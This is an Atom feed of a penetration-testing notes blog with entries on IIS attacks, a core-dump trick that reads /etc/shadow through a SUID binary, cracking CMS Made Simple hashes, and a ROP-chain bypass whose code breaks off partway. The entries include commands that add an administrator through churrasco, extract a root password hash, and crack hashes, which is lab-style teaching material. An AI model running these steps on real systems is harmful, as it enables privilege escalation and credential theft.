<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>Spindel</title>
 <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
 <link href="https://mvineza.github.io/spindel/"/>
 <updated>2022-01-22T10:11:06+08:00</updated>
 <id>https://mvineza.github.io</id>
 <author>
   <name>spindel</name>
   <email>rell.vineza14@yahoo.com</email>
 </author>

 
 <entry>
   <title>IIS</title>
   <link href="https://mvineza.github.io/spindel/2022/01/22/iis"/>
   <updated>2022-01-22T00:00:00+08:00</updated>
   <id>https://mvineza.github.io/2022/01/22/IIS</id>
   <content type="html">&lt;h2 id=&quot;ports&quot;&gt;Ports&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;4XXXX/tcp&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;common-pages&quot;&gt;Common Pages&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Under construction&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/spindel/assets/IIS/7BA3331D-7A92-4B19-98EE-2FD576CCA13C.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;404&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/spindel/assets/IIS/2CFBCCD1-49F9-400F-935E-9B3DA8A98BF6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;headers&quot;&gt;Headers&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap&lt;/span&gt;
nmap &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 10.10.10.29 &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-iis-webdav-vuln

&lt;span class=&quot;c&quot;&gt;# Other way of getting IIS version. You will see&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# something like &quot;Server: Microsoft-IIS/10.0&quot;&lt;/span&gt;
curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://10.10.10.29

&lt;span class=&quot;c&quot;&gt;# You can get the iisfinal.txt from hacktricks and&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# feed it to gobuster.&lt;/span&gt;
curl https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-L_YlVBGlH_l7w9zCtQO%2F-L_YlWYOMUA7fr799GvH%2Fiisfinal.txt?alt&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;media&amp;amp;token&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;de499b23-3599-45ce-ad7e-7800858b3dac &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; iisfinal.txt
gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.29 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; iisfinal.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;interesting-files&quot;&gt;Interesting Files&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Constains sql connection strings, passwords and other&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# sensitive data. This is similar to `.htaccess` in apache.&lt;/span&gt;
web.config

&lt;span class=&quot;c&quot;&gt;# index file&lt;/span&gt;
iisstart.htm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;logins&quot;&gt;Logins&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Brute force&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap&lt;/span&gt;
nmap &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 10.10.10.29 &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-iis-short-name-brute
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Try to access some DLLs, they may expose some login page.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/spindel/assets/IIS/A482503E-8679-49FB-B8D4-A42BA2BCB6D9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;downloads&quot;&gt;Downloads&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;10.X - latest version as of November 2021&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;appcmdexe&quot;&gt;appcmd.exe&lt;/h2&gt;
&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# check if you have permissions&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C:\Windows\system32\inetsrv\appcmd.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apppools&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# may show credentials&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C:\Windows\system32\inetsrv\appcmd.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vdir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.netspi.com/blog/technical/network-penetration-testing/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/&quot;&gt;Decrypting IIS Passwords to Break Out of the DMZ: Part 2&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;some-vulnerabilities&quot;&gt;Some Vulnerabilities&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/&quot;&gt;IIS7 and higher RCE&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/6705&quot;&gt;Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# https://github.com/Re4son/Churrasco&lt;/span&gt;
c:&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;netpub&amp;gt;churrasco.exe &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;net user /add &amp;lt;username&amp;gt; &amp;lt;password&amp;gt;&quot;&lt;/span&gt;
c:&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;netpub&amp;gt;churrasco.exe &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;net localgroup administrators &amp;lt;username&amp;gt; /add&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;other-resources&quot;&gt;Other resources&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services&quot;&gt;IIS - Internet Information Services - HackTricks&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>Core Dump Technique</title>
   <link href="https://mvineza.github.io/spindel/2022/01/19/core-dump-technique"/>
   <updated>2022-01-19T00:00:00+08:00</updated>
   <id>https://mvineza.github.io/2022/01/19/Core-Dump-Technique</id>
   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
&lt;p&gt;Attacker can force crash a program to generate a coredump so he can read the buffered data (eg&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; ) inside.&lt;/p&gt;

&lt;h2 id=&quot;environment&quot;&gt;Environment&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Program has SUID bit set&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 17824 Oct  7 10:03 count&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Program also forces core dump generation&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;prctl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PR_SET_DUMPABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs.suid_dumpable&lt;/code&gt; is set to 2.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/sys/fs/suid_dumpable
2
dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Run program and put a sensitive file and stop at another user input&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./count 
Enter &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;file/directory name: /etc/shadow

Total characters &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1187
Total words      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 36
Total lines      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 36
Save results a file? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/N]: 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Background the program&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./count 
Enter &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;file/directory name: /etc/shadow

Total characters &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1187
Total words      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 36
Total lines      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 36
Save results a file? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/N]: ^Z
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1]+  Stopped                 ./count
dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Send &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SIGSEGV&lt;/code&gt; signal. You can also use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kill -BUS PID&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;kill&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-SIGSEGV&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;pidof count&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Resume the job and you will see core dump has been generated&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fg&lt;/span&gt;
./count
Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lrt&lt;/span&gt; /var/crash/
total 32
&lt;span class=&quot;nt&quot;&gt;-rw-r-----&lt;/span&gt; 1 dasith dasith 28756 Dec 11 04:51 _opt_count.1000.crash
dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;To analyze the coredump, use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apport-unpack&lt;/code&gt; and open &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CoreDump&lt;/code&gt; file&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report
dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings /tmp/crash-report/CoreDump | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;root
root:&lt;span class=&quot;nv&quot;&gt;$6$/&lt;/span&gt;0f5J.S8.u.dA78h&lt;span class=&quot;nv&quot;&gt;$xSyDRhh5Zf18Ha9XNVo5dvPhxnI0i7D&lt;/span&gt;/uD8T5FcYgN1FYMQbvkZakMgjgm3bhtS6hgKWBcD/QJqPgQR6cycFj.:18873:0:99999:7:::
dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;HTB secret&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>CMS Made Simple</title>
   <link href="https://mvineza.github.io/spindel/2022/01/16/cms-made-simple"/>
   <updated>2022-01-16T00:00:00+08:00</updated>
   <id>https://mvineza.github.io/2022/01/16/CMS-Made-Simple</id>
   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;/spindel/assets/CMS%20Made%20Simple/20E7EA44-40D7-4648-B62C-75B0B1FF9941.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.cmsmadesimple.org/&quot;&gt;Open Source Content Management System : : CMS Made Simple&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;version&quot;&gt;Version&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Via changelog &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/doc/CHANGELOG.txt&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Inside admin page, bottom part&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;credentials&quot;&gt;Credentials&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Passwords are  stored in database using 1-way password scheme&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select user_id,username,password from cms_users;
+---------+----------+----------------------------------+
| user_id | username | password                         |
+---------+----------+----------------------------------+
|       1 | admin    | 9dfb6c17c8992e3a821c47b68fe8e76a |
|       2 | editor   | 5aee9dbd2a188839105073571bee1b1f |
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;You can crack it via hascat&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 62def4866937f08cc13bab43bb14e6f7 - hashed password&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 5a599ef579066807 - salt&lt;/span&gt;
hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 20 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807 /usr/share/wordlists/rockyou.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;interesting-url-paths&quot;&gt;Interesting URL Paths&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;/spindel/assets/CMS%20Made%20Simple/49CFCD40-2C62-453A-872C-91DEAAAF5E2C.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Reference: http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk/&lt;/p&gt;

&lt;h2 id=&quot;interesting-files&quot;&gt;Interesting Files&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;config.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cookie-format&quot;&gt;Cookie Format&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Example:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# CMSSESSID9d372ef93962=75gsp75a2vdo6ijapmnvqrkdb2&lt;/span&gt;
CMSSESSID&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;some-exploits&quot;&gt;Some Exploits&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# CVE-2019-9053 - change TIME to 2 for better result&lt;/span&gt;
searchploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; php/webapps/46635.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.netsparker.com/blog/web-security/exploiting-ssti-and-xss-in-cms-made-simple/&quot;&gt;Identifying &amp;amp; Exploiting SSTI &amp;amp; XSS in CMS Made Simple&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>Bypass ASLR + NX (64-bit) - ROP Chain</title>
   <link href="https://mvineza.github.io/spindel/2022/01/15/bypass-aslr-nx-64-bit-rop-chain"/>
   <updated>2022-01-15T00:00:00+08:00</updated>
   <id>https://mvineza.github.io/2022/01/15/Bypass-ASLR-NX-64-bit-ROP-Chain</id>
   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
&lt;p&gt;If ASLR and NX is enabled on a 64-bit program, this means we cannot execute code on stack and address space of libraries changes on every program run.&lt;/p&gt;

&lt;p&gt;In this technique, we can find some ROP gadgets whose address are static and we can use them to do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid(0)&lt;/code&gt; and drop to a shell using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execvpe()&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;environment-setup&quot;&gt;Environment Setup&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;SETUID program whose vulnerable to buffer overflow. In this example, we can see that even though &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fgets&lt;/code&gt; is assumed to be safe from bufferoverflow, a misconfigured program is still vulnerable.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// filename: iptctl&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// [...redacted...]&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 360 bytes here&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define BUFFSIZE 360
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inputAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// but destination buffer locally is 10 bytes only!&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// this is the buffer overflow part&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inputAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Entering interactive mode&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Action(allow|restrict|show): &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// hence, fgets is not using the correct buffer size&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUFFSIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// this also have vulnerable fgets but we will ignore&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// this part since its hard to send arbritrary input&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// here, inputAddress is being validated properly&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUFFSIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;inputAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// this is the validation part, isValidIpAddress is&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// validated properly but not isValidAction&lt;/span&gt;
